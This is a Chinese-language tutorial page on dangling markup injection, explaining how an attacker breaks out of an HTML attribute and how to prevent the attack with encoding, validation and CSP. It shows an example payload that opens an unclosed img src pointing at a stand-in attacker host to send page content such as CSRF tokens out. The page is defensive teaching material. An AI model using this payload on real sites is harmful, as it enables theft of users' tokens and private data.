# 悬挂标记注入

在本节中，我们将解释什么是悬挂标记注入、典型的利用方式如何工作，以及如何防止悬挂标记攻击。

## 什么是悬挂标记注入？

悬挂标记注入是一种在无法实施完整跨站脚本攻击的情况下，用于跨域捕获数据的技术。

假设一个应用程序以不安全的方式将攻击者可控制的数据嵌入到其响应中：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

再假设应用程序没有过滤或转义 `>` 或 `"` 字符。攻击者可以使用以下语法跳出带引号的属性值和外层标签，返回到 HTML 上下文中：

```html
">
```

在这种情况下，攻击者自然会尝试执行 XSS。但假设由于输入过滤器、内容安全策略或其他障碍，常规 XSS 攻击无法实现。此时，仍然可能使用如下载荷实施悬挂标记注入攻击：

```html
"><img src='//attacker-website.com?
```

该载荷创建了一个 `img` 标签，并定义了一个 `src` 属性的起始部分，其中包含指向攻击者服务器的 URL。请注意，攻击者的载荷没有闭合 `src` 属性，因此该属性是“悬挂”的。当浏览器解析响应时，它会向前查找，直到遇到一个单引号来终止该属性。在此之前的所有内容都会被视为 URL 的一部分，并作为 URL 查询字符串发送到攻击者的服务器。任何非字母数字字符（包括换行符）都会被 URL 编码。

攻击的结果是，攻击者可以捕获注入点之后应用程序响应的一部分，其中可能包含敏感数据。根据应用程序的功能，这可能包括 CSRF 令牌、电子邮件或财务数据。

任何能够发起外部请求的属性都可以用于悬挂标记注入。

下一个实验难以解决，因为所有外部请求都被阻止。但是，某些标签允许你存储数据并在以后从外部服务器检索。解决该实验可能需要用户交互。

## 如何防止悬挂标记攻击

你可以使用与[防止跨站脚本](/web-security/cross-site-scripting/preventing)相同的通用防御措施来防止悬挂标记攻击，即在输出时对数据进行编码，并在输入时进行验证。

你还可以使用[内容安全策略](/web-security/cross-site-scripting/content-security-policy)（CSP）来缓解某些悬挂标记攻击。例如，你可以通过策略阻止 `img` 等标签加载外部资源，从而防止部分（但不是全部）攻击。

> **注意：** Chrome 浏览器已决定通过阻止 `img` 等标签定义包含尖括号和换行符等原始字符的 URL 来处理悬挂标记攻击。这将防止攻击，因为可能被捕获的数据通常包含这些原始字符，因此攻击会被阻止。
